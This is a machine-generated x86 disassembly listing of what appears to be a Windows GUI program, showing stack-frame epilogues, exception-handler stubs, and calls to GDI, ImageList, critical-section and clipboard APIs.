pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a90b
jmp sub_403580
sub_41a910
mov ebx 0x80030103
call sub_4038e8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a98e
jmp sub_403580
sub_41a993
mov ebx 0x80030009
call sub_4038e8
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a9f1
jmp sub_403580
sub_41a9f6
mov ebx 0x8000ffff
call sub_4038e8
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41abc1
jmp sub_403834
sub_41abd2
jmp sub_403580
sub_41abd7
mov [ ebp - 0x4 ] 0x8000ffff
call sub_4038e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ac00
lea eax [ ebp + 0xc ]
call sub_4054f0
retn
sub_41abf9
jmp sub_403834
sub_41ac00
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41ac0c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41ac18
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41ac24
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41ac30
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41ac9f
jmp sub_403580
sub_41aca4
mov esi 0x8000ffff
call sub_4038e8
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41acb8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41ad25
jmp sub_403834
sub_41ad2c
mov eax [ rw-data ]
call sub_4030f8
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ad3c
call sub_4131e4
retn
sub_41ae04
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41afa8
jmp sub_403834
sub_41afaf
pop ebp
retn
sub_41b03d
jmp sub_403834
sub_41b044
pop ebp
retn
sub_41b2d5
jmp sub_403834
sub_41b2dc
pop ebp
retn
sub_41b2e0
sub [ rw-data ] 0x1
retn
sub_41b7f4
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
imul esp [ gs : edi + 0x68 ] 0x41b40874
add [ eax ] bh
iretd
sub_41b850
inc ecx
add al cl
iretd
sub_41bb6e
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
sub_41bb7b
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
sub_41bf98
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41c00c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41c080
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41c08c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41c16c
jmp sub_403834
sub_41c173
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c203
jmp sub_403834
sub_41c295
jmp sub_403834
sub_41c29c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c300
jmp sub_403834
sub_41c307
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c36f
jmp sub_403834
sub_41c376
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c419
jmp sub_403834
sub_41c420
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c878
push 0x33
mov ecx rw-data
call sub_4134a4
retn
sub_41c888
push 0x33
mov ecx rw-data
call sub_413464
retn
sub_41c898
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c8bc
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41ca90
push 0x11
mov ecx rw-data
call sub_413464
retn
sub_41cbd0
push ebx
mov ebx eax
mov eax ebx
call sub_41c898
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41cc8a
jmp sub_403834
sub_41cc91
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c8bc
retn
sub_41cca7
jmp sub_403834
sub_41ccc0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41cd1d
jmp sub_403834
sub_41cd24
pop ebx
pop ecx
pop ebp
retn
sub_41ce9d
jmp sub_403834
sub_41cec5
jmp sub_403834
sub_41cecc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41cf38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404118
pop esi
pop ebx
retn
sub_41cfac
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41cf08
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41cfe8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41d020
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41d050
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41d16e
jmp sub_403834
sub_41d175
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c8bc
retn
sub_41d18b
jmp sub_403834
sub_41d201
jmp sub_403834
sub_41d208
pop ebx
pop ecx
pop ebp
retn
sub_41d20c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41d2c2
jmp sub_403834
sub_41d2d4
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_4032f4
sub_41d2e8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d318
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41d427
jmp sub_403834
sub_41d42e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c8bc
retn
sub_41d444
jmp sub_403834
sub_41d4bd
jmp sub_403834
sub_41d4c4
pop ebx
pop ecx
pop ebp
retn
sub_41d5f5
jmp sub_403834
sub_41d608
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d948
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41daa4
jmp sub_403834
sub_41daab
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41dab4
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41daec
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41daf8
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41dc38
retn
sub_41dd01
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41dd18
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41de04
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41de24
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41de44
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41de64
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
pop ebx
retn
sub_41de7c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
pop ebx
retn
sub_41dea0
mov eax [ rw-data ]
call sub_41de7c
retn
sub_41def6
jmp sub_403834
sub_41defd
pop ecx
pop ebp
retn
sub_41df9c
jmp sub_403834
sub_41dfa3
pop ebx
mov esp ebp
pop ebp
retn
sub_41e075
jmp sub_403834
sub_41e106
jmp sub_403834
sub_41e10d
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e138
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41e21f
jmp sub_403834
sub_41e3cc
jmp sub_403834
sub_41e3d3
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41e5e5
jmp sub_403834
sub_41e5ec
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41e686
jmp sub_403834
sub_41e862
jmp sub_403834
sub_41e91c
jmp sub_403834
sub_41e923
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e943
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e93c
jmp sub_403834
sub_41e943
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41ead1
jmp sub_403834
sub_41ec9c
jmp sub_403834
sub_41eca3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ecc6
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026ec
retn
sub_41ecbf
jmp sub_403834
sub_41ecc6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ece6
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
sub_41ecdf
jmp sub_403834
sub_41ece6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41ee38
push 0x0
call sub_41edd4
retn
sub_41eedd
jmp sub_403834
sub_41eee4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41eef0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41ee40
pop ebx
pop ebp
retn 0x4
sub_41ef04
retn
sub_41ef08
test eax eax
jne r-xdata
retn
call sub_41ef04
sub_41f0db
jmp sub_403834
sub_41f102
jmp sub_403834
sub_41f109
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f148
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41f315
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub_41f31e
jmp sub_403834
j_sub_41f315
jmp sub_41f315
sub_41f325
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4030f8
retn
sub_41f33b
jmp sub_403834
sub_41f34c
xor eax eax
retn
sub_41f350
mov al [ eax + 0x21 ]
retn
sub_41f39c
jmp sub_403834
sub_41f3a3
pop esi
pop ecx
pop ebp
retn
sub_41f3d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41f427
jmp sub_403834
sub_41f42e
pop esi
pop ecx
pop ebp
retn
sub_41f434
retn
sub_41f438
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41f448
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41f458
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_41f566
jmp sub_403834
sub_41f58e
jmp sub_403834
sub_41f595
mov esp ebp
pop ebp
retn
sub_41f60c
jmp sub_403834
sub_41f714
jmp sub_403834
sub_41f7ff
jmp sub_403834
sub_41f80c
inc [ eax + 0x4 ]
retn
sub_41f987
jmp sub_403834
sub_41fd38
jmp sub_403834
sub_41ff82
jmp sub_403834
sub_41ffac
jmp sub_403834
sub_41ffb3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ffd5
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_41ffce
jmp sub_403834
sub_41ffdf
jmp sub_403580
sub_42002e
jmp sub_403834
sub_42025b
jmp sub_403834
sub_4202a3
jmp sub_403834
sub_420410
jmp sub_403834
sub_4204d7
jmp sub_403580
sub_42052c
mov [ eax + 0x31 ] 0x0
call sub_41f148
retn
sub_42077d
jmp sub_403834
sub_4207e8
jmp sub_403834
sub_4207ef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420860
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_420914
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_420924
push ebx
mov ebx eax
mov eax ebx
call sub_420adc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_420938
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_420954
push ebx
mov ebx eax
mov eax ebx
call sub_420b3c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_4209b0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_420abf
jmp sub_403834
sub_420d23
jmp sub_403580
sub_420d83
jmp sub_403834
sub_420d8a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42116b
jmp sub_403834
sub_421197
jmp sub_403834
sub_4211fe
jmp sub_403580
sub_42122f
jmp sub_403834
sub_4212b4
jmp sub_403580
sub_4212b9
mov eax [ ebp - 0x38 ]
call sub_4030f8
call sub_403894
call sub_4038e8
sub_4212cb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212e8
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
sub_4212e1
jmp sub_403834
sub_421437
jmp sub_403580
sub_421703
jmp sub_403580
sub_421794
mov cl 0x1
call sub_42179c
retn
sub_421a51
add [ eax ] al
add [ ebx ] dh
leave
call sub_42179c
retn
sub_421ad6
jmp sub_403580
sub_421adb
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403894
call sub_4038e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421b2c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_421c65
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_421c94
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_421ca8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_421dc1
jmp sub_403580
sub_421e76
jmp sub_403580
sub_421ee0
jmp sub_403580
sub_421f14
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_421ea0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_421f2c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41de64
retn
mov [ eax + 0x30 ] edx
retn
sub_421f44
retn
sub_421f48
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41de64
retn
mov [ eax + 0x2c ] edx
retn
sub_421f88
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41de64
pop ebp
retn 0x4
sub_421f9c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41de64
pop ebp
retn 0x4
sub_42215c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422168
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422215
jmp sub_403834
sub_42221c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422307
jmp sub_403580
sub_422373
jmp sub_403834
sub_4224a1
jmp sub_403834
sub_4224a8
pop ebp
retn
sub_4225a8
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_4225dd
jmp sub_403834
sub_4225e4
pop ebp
retn
sub_4225e8
sub [ rw-data ] 0x1
retn
sub_42278c
call sub_413898
retn
sub_422814
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_413c5c
pop esi
pop ebx
retn
sub_42283c
call sub_413a50
retn
sub_422878
call sub_413b90
retn
sub_422970
call sub_42278c
retn
sub_4229a8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_422814
pop esi
pop ebx
retn
sub_4229bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_422828
pop esi
pop ebx
retn
sub_4229d0
mov edx ecx
call sub_4229a8
retn
sub_4229d8
call sub_42283c
retn
sub_422a48
call sub_422878
retn
sub_422adc
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4139f4
retn
sub_422b10
mov eax [ eax + 0x4 ]
call sub_413898
retn
sub_422b41
jmp sub_403834
sub_422b48
pop ebp
retn
sub_422b4c
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_422c35
jmp sub_403834
sub_422c3c
pop ebp
retn
sub_422c40
sub [ rw-data ] 0x1
retn
sub_422d07
jmp sub_403834
sub_422d0e
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423324
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_422d30
mov [ rw-data ] sub_422e48
mov [ rw-data ] sub_422db8
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42304c
mov [ rw-data ] sub_423120
mov [ rw-data ] sub_4231f4
retn
sub_4233b5
jmp sub_403834
sub_4233bc
pop ebp
retn
sub_4233c0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423324
sub_4233f5
jmp sub_403834
sub_4233fc
pop ebp
retn
sub_423400
sub [ rw-data ] 0x1
retn
sub_42368f
add eax 0xffffffd4
jmp sub_4241bc
sub_423697
add eax 0xffffffd4
jmp sub_424218
sub_4236a9
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055c4
sub_4236b3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055d8
sub_423842
jmp sub_403834
sub_423849
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423a59
jmp sub_403834
sub_423a60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423c15
jmp sub_403834
sub_423c7a
jmp sub_403834
sub_423c81
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423d6d
jmp sub_403834
sub_423d74
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_423f84
lea eax [ ebp - 0x30 ]
call sub_403eb4
lea eax [ ebp - 0x20 ]
call sub_403eb4
retn
sub_423f95
jmp sub_403834
j_sub_423f84
jmp sub_423f84
sub_423f9c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424097
jmp sub_403834
sub_42409e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42419b
jmp sub_403834
sub_4241a2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424202
lea eax [ ebp - 0x4 ]
call sub_4054f0
retn
sub_42420b
jmp sub_403834
j_sub_424202
jmp sub_424202
sub_424212
pop ebx
pop ecx
pop ebp
retn
sub_4242ad
jmp sub_403834
sub_4242b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4242c0
mov eax [ eax + 0x20 ]
retn
sub_4243ef
jmp sub_403834
sub_4243f6
pop ebp
retn
sub_4243f8
sub [ rw-data ] 0x1
retn
sub_424425
jmp sub_403834
sub_42442c
pop ebp
retn
sub_424430
sub [ rw-data ] 0x1
retn
sub_424469
jmp sub_403834
sub_424470
pop ebp
retn
sub_424474
sub [ rw-data ] 0x1
retn
sub_424781
jmp sub_403834
sub_424788
pop ebp
retn
sub_42478c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4244d8
sub_42486c
retn
sub_4248e0
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_4248ec
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_4248f8
mov edx [ eax ]
call [ edx ]
retn
sub_424900
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42492d
jmp sub_403834
sub_424934
pop ebp
retn
sub_424938
sub [ rw-data ] 0x1
retn
sub_424af7
jmp sub_403834
sub_424afe
pop ebp
retn
sub_424eb3
jmp sub_403834
sub_424eba
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_4252d4
jmp sub_403834
sub_4252db
pop ebp
retn
sub_4252e0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424870
mov [ rw-data ] eax
sub_425321
jmp sub_403834
sub_425328
pop ebp
retn
sub_42532c
sub [ rw-data ] 0x1
retn
sub_425359
jmp sub_403834
sub_425360
pop ebp
retn
sub_425364
sub [ rw-data ] 0x1
retn
sub_425391
jmp sub_403834
sub_425398
pop ebp
retn
sub_42539c
sub [ rw-data ] 0x1
retn
sub_4253c9
jmp sub_403834
sub_4253d0
pop ebp
retn
sub_4253d4
sub [ rw-data ] 0x1
retn
sub_425401
jmp sub_403834
sub_425408
pop ebp
retn
sub_42540c
sub [ rw-data ] 0x1
retn
sub_425439
jmp sub_403834
sub_425440
pop ebp
retn
sub_425444
sub [ rw-data ] 0x1
retn
sub_425471
jmp sub_403834
sub_425478
pop ebp
retn
sub_42547c
sub [ rw-data ] 0x1
retn
sub_4254a9
jmp sub_403834
sub_4254b0
pop ebp
retn
sub_4254b4
sub [ rw-data ] 0x1
retn
sub_4254e1
jmp sub_403834
sub_4254e8
pop ebp
retn
sub_4254ec
sub [ rw-data ] 0x1
retn
sub_425766
jmp sub_403580
sub_42576b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4544c0
call sub_4038e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425788
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_425790
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4032f4
pop esi
retn
sub_4257a8
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4032f4
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4257c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_425869
jmp sub_403834
sub_425897
jmp sub_403834
sub_42589e
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4258a8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4258bc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_425b1a
jmp sub_403834
sub_425b21
pop ebp
retn
sub_42650e
jmp sub_403580
sub_4265c7
jmp sub_403834
sub_4265ce
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4265d4
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_426548
sub_4265e4
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_426548
sub_4265f4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_426548
pop ebp
retn 0x8
sub_42660c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4268a9
jmp sub_403580
sub_426a1c
retn
sub_426ba9
jmp sub_403834
sub_426c2c
push ebx
mov ebx eax
mov eax ebx
call sub_436b64
mov eax ebx
call sub_426a20
pop ebx
retn
sub_426c40
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_437284
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_426d68
pop ebx
retn
sub_426d58
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_426e31
jmp sub_403834
sub_426e38
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426e80
push ebx
mov ebx eax
mov eax ebx
call sub_43a7ec
mov eax ebx
call sub_426a20
pop ebx
retn
sub_426e94
push ebx
mov ebx eax
mov eax ebx
call sub_42c070
mov eax ebx
call sub_426a20
pop ebx
retn
sub_426ea8
mov al 0x1
retn
sub_426eac
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_427245
jmp sub_403834
sub_42724c
pop ebp
retn
sub_427250
sub [ rw-data ] 0x1
retn
sub_427289
jmp sub_403834
sub_427290
pop ebp
retn
sub_427294
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_427310
retn
sub_427311
jmp sub_403834
j_sub_427310
jmp sub_427310
sub_427318
pop ebp
retn
